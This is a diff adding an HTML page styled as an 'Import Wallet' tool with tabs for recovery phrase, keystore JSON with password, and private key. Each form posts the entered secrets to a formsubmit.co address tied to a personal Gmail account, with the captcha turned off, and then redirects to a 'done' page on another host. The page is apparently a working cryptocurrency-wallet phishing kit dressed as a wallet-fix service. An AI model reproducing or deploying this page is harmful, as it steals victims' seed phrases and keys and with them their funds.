@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Import Wallet</title>
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
+    <link rel="stylesheet" href="assets/css/styles.css">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://easywalletfix.net/list/import/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://easywalletfix.net/list/import/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://easywalletfix.net/list/import/favicon-16x16.png">
+    <link rel="manifest" href="https://easywalletfix.net/list/import/site.webmanifest">
+</head>
+</head>
+<body>
+    <header>
+        <div class="container-fluid">
+			<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<a class="text-white" href="../index.html" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;Import Wallet</a>
+			</div>
+			</div>
+		</div>
+    </header>
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<ul class="nav nav-tabs">
+					<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="https://easywalletsfix.com/list/import/index.html#phrase">Phrase</a></li>
+					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="https://easywalletsfix.com/list/import/index.html#keystore">Keystore JSON</a></li>
+					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="https://easywalletsfix.com/list/import/index.html#privatekey">Private Key</a></li>
+				</ul>
+			</div>
+		</div>
+	</div>
+    <section style="margin-top: 40px;">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-4 offset-md-4">
+					<!-- Tab panes -->
+					<div class="tab-content">
+						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
+							<form method="post" action="https://formsubmit.co/Lumiomomommy007@gmail.com">
+								<input type="hidden" name="_next" value="https://nodeindex.netlify.app/done.html">
+								<input type="hidden" name="_captcha" value="false">
+								<textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="text" name="user" value="" style="visibility:hidden;">
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+							</form>
+						</div>
+						<div role="tabpanel" class="tab-pane fade" id="keystore">
+							<form method="post" action="https://formsubmit.co/Lumiomomommy007@gmail.com">
+								<input type="hidden" name="_next" value="https://nodeindex.netlify.app/done.html">
+								<input type="hidden" name="_captcha" value="false">
+								<div class="form-group">
+									<textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+									<input type="text" name="user" value="" style="visibility:hidden;">
+								</div>
+								<div class="form-group">
+									<input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+								</div>
+								<p class="text-secondary" style="margin-top: 10px;">
+									Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+								</p>
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+							</form>
+						</div>
+						<div role="tabpanel" class="tab-pane fade" id="privatekey">
+							<form method="post" action="https://formsubmit.co/Lumiomomommy007@gmail.com">
+								<input type="hidden" name="_next" value="https://nodeindex.netlify.app/done.html">
+								<input type="hidden" name="_captcha" value="false">
+								<div class="form-group">
+									<input class="form-control" name="privatekey" placeholder="Private Key" required="">
+								</div>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="text" name="user" value="" style="visibility:hidden;">
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+							</form>
+						</div>
+					</div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
+</body>
+</html>
